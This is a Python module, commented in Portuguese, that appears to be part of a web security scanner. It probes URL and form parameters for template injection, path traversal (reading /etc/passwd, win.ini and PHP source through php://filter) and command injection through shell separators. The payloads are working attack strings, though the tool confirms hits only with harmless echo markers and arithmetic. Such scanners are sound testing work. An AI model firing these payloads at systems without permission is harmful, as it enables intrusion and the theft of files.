import base64
import concurrent.futures
import random
import re
import urllib.parse

import requests

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SecAudit/AdvancedInjection"
REQUEST_TIMEOUT = 5
MAX_PARAMS = 6
MAX_WORKERS = 8

SSTI_TEMPLATES = [
    ("Jinja2/Twig", "{{A*B}}"),
    ("JSP/EL", "${A*B}"),
    ("Ruby ERB", "#{A*B}"),
    ("ERB/EJS", "<%= A*B %>"),
]

LFI_PAYLOADS = [
    ("Linux /etc/passwd", "../../../../../../etc/passwd", ["root:x:0:0", "daemon:x:", "bin:x:"]),
    ("Linux bypass", "....//....//....//....//etc/passwd", ["root:x:0:0"]),
    ("Linux absoluto", "/etc/passwd", ["root:x:0:0"]),
    ("Windows win.ini", "..\\..\\..\\..\\windows\\win.ini", ["[fonts]", "for 16-bit app support"]),
    ("PHP filter (base64)", "php://filter/convert.base64-encode/resource=index.php", None),
]

# Marcador aleatório por execução para evitar cache e falsos positivos
CMD_TEMPLATES = [
    (";echo MARKER", "ponto e vírgula"),
    ("|echo MARKER", "pipe"),
    ("$(echo MARKER)", "substituição de comando"),
    ("&echo MARKER", "background"),
]


def _rand_marker():
    return "qa" + "".join(random.choice("abcdef0123456789") for _ in range(12))


def extract_parameters(target_url, html_content=None):
    """Descobre parâmetros na URL e em formulários HTML da página."""
    params = []
    parsed = urllib.parse.urlparse(target_url)

    if parsed.query:
        for name, _ in urllib.parse.parse_qsl(parsed.query, keep_blank_values=True):
            params.append({"url": target_url, "method": "GET", "name": name, "location": "URL"})

    if html_content and not params:
        for form in re.finditer(r"<form\b[^>]*>(.*?)</form>", html_content, re.IGNORECASE | re.DOTALL):
            form_html = form.group(0)
            body = form.group(1)
            action_match = re.search(r"\baction\s*=\s*[\"']([^\"']*)", form_html, re.IGNORECASE)
            method_match = re.search(r"\bmethod\s*=\s*[\"']([^\"']*)", form_html, re.IGNORECASE)
            action = action_match.group(1).strip() if action_match else ""
            action_url = urllib.parse.urljoin(target_url, action or target_url)
            method = (method_match.group(1).strip().upper() if method_match else "GET")
            if method not in ("GET", "POST"):
                method = "GET"
            for field in re.finditer(r"<(?:input|textarea|select)\b[^>]*\bname\s*=\s*[\"']([^\"']+)[\"']", body, re.IGNORECASE):
                params.append({"url": action_url, "method": method, "name": field.group(1), "location": "Formulário"})

    if not params:
        params.append({"url": target_url, "method": "GET", "name": "q", "location": "Fallback"})

    unique = []
    seen = set()
    for p in params:
        key = (p["url"], p["method"], p["name"])
        if key in seen:
            continue
        seen.add(key)
        unique.append(p)
        if len(unique) >= MAX_PARAMS:
            break
    return unique


def _build_get_url(url, name, value):
    parsed = urllib.parse.urlsplit(url)
    query = [(k, v) for k, v in urllib.parse.parse_qsl(parsed.query, keep_blank_values=True) if k != name]
    query.append((name, value))
    return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, urllib.parse.urlencode(query), parsed.fragment))


def _send(param, payload):
    """Envia o payload em um único parâmetro. Retorna (url, texto) ou None."""
    try:
        if param["method"] == "POST":
            resp = requests.post(
                param["url"],
                data={param["name"]: payload},
                timeout=REQUEST_TIMEOUT,
                headers={"User-Agent": USER_AGENT},
            )
            return param["url"], resp.text
        test_url = _build_get_url(param["url"], param["name"], payload)
        resp = requests.get(
            test_url,
            timeout=REQUEST_TIMEOUT,
            headers={"User-Agent": USER_AGENT},
        )
        return test_url, resp.text
    except Exception:
        return None


def _is_php_filter_leak(text):
    """Procura base64 de código PHP no corpo (php://filter)."""
    for blob in re.findall(r"[A-Za-z0-9+/=]{80,}", text or ""):
        try:
            decoded = base64.b64decode(blob, validate=True).decode("utf-8", errors="ignore")
        except Exception:
            continue
        if "<?php" in decoded or "<?=" in decoded:
            return True
    return False


def _build_finding(kind, param, payload, test_url, evidence, desc, impact, fix):
    return {
        "type": kind,
        "parameter": param["name"],
        "method": param["method"],
        "payload": payload,
        "url": test_url,
        "evidence": evidence,
        "severity": "ALTA",
        "status": "Vulnerável",
        "desc": desc,
        "impact": impact,
        "fix": fix,
    }


def _test_task(param, kind, label, payload, expected):
    """Executa um teste e devolve um achado quando confirmado."""
    result = _send(param, payload)
    if not result:
        return None
    test_url, text = result
    text = text or ""

    if kind == "SSTI":
        confirmed = str(expected) in text and payload not in text
        evidence = f"Expressão avaliada no servidor (resultado {expected}) — motor provável: {label}"
        desc = f"O parâmetro '{param['name']}' é renderizado por um template engine ({label})."
        impact = "O atacante executa expressões no servidor e pode chegar a execução remota de código, ler arquivos e acessar segredos da aplicação."
        fix = "Não renderizar entrada do usuário como template; usar contexto seguro e desabilitar recursos perigosos do engine."
    elif kind == "LFI":
        if label == "PHP filter (base64)":
            confirmed = _is_php_filter_leak(text)
            evidence = "Resposta contém código PHP codificado em base64 (php://filter)"
        else:
            confirmed = any(sig in text for sig in (expected or [])) and payload not in text
            evidence = "Conteúdo de arquivo do sistema encontrado na resposta"
        desc = f"O parâmetro '{param['name']}' permite incluir/ler arquivos do servidor ({label})."
        impact = "O atacante lê arquivos sensíveis do servidor (credenciais, código-fonte, chaves) e pode escalar para execução de código."
        fix = "Validar o caminho contra uma allowlist, usar caminhos absolutos internos e bloquear sequências de traversal."
    else:  # CMD
        confirmed = expected in text and payload not in text
        evidence = "Comando 'echo' executado no servidor (marcador exclusivo retornado)"
        desc = f"O parâmetro '{param['name']}' é concatenado em um comando do sistema ({label})."
        impact = "O atacante executa comandos arbitrários no servidor, podendo ler dados, instalar backdoors e pivotar na rede."
        fix = "Nunca montar comandos com entrada do usuário; usar APIs nativas e listas de argumentos."

    if not confirmed:
        return None
    return _build_finding(kind, param, payload, test_url, evidence, desc, impact, fix)


def run_advanced_injection(target_url, html_content=None):
    """
    Testa SSTI, LFI/Path Traversal e Command Injection de forma
    NÃO destrutiva (apenas leitura de arquivos e eco de marcador).
    """
    params = extract_parameters(target_url, html_content)
    a = random.randint(1000, 9999)
    b = random.randint(1000, 9999)
    product = a * b
    marker = _rand_marker()

    tasks = []
    for param in params:
        for label, template in SSTI_TEMPLATES:
            payload = template.replace("A", str(a)).replace("B", str(b))
            tasks.append((param, "SSTI", label, payload, product))
        for label, payload, signatures in LFI_PAYLOADS:
            tasks.append((param, "LFI", label, payload, signatures))
        for template, label in CMD_TEMPLATES:
            payload = template.replace("MARKER", marker)
            tasks.append((param, "CMD", label, payload, marker))

    findings = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(_test_task, *task) for task in tasks]
        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
            except Exception:
                result = None
            if result:
                findings.append(result)

    # Remove duplicatas do mesmo tipo/parâmetro/payload
    unique = []
    seen = set()
    for f in findings:
        key = (f["type"], f["parameter"], f["payload"])
        if key in seen:
            continue
        seen.add(key)
        unique.append(f)

    return {
        "tested": len(tasks),
        "parameters": [f"{p['method']} {p['name']}" for p in params],
        "findings": unique,
    }
